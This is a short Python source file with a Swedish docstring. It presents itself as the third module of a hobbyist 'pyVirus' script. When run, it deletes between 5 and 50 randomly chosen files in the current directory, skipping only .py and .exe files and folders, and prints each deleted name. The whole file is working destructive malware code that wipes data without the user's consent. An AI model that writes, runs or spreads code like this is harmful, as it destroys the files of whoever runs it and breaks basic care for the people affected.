#!/usr/bin/env python
"""
pyVirus_modul3.py av Stefan Blecko. Version 0.1 2021

Detta är tredje modulen till pyVirus.py skriptet. pyVirus_modul3.py kommer
sammanfogas med pyVirus.py vid ett senare tillfälle. Skriptet radarar slumpmässigt
mellan 5-50 filer varje gång det körs. .py och .exe filer samt mappar raderas inte.
"""


from pathlib import Path
import random
import time

def number_of_files():
    return int(random.randrange(5, 50))

def directory():
    p = Path('.')
    return p.iterdir()

def main():
    for item in range(number_of_files()):
        rnd_pick = random.choice(list(directory()))
        if rnd_pick.suffix == ".py" or rnd_pick.suffix == ".exe":
            pass
        elif rnd_pick.is_dir():
            pass
        else:
            print(rnd_pick, 'raderad')
            try:
                rnd_pick.unlink()
            except (FileNotFoundError, PermissionError, IndexError):
                pass

    time.sleep(3)


if __name__ == "__main__":
    main()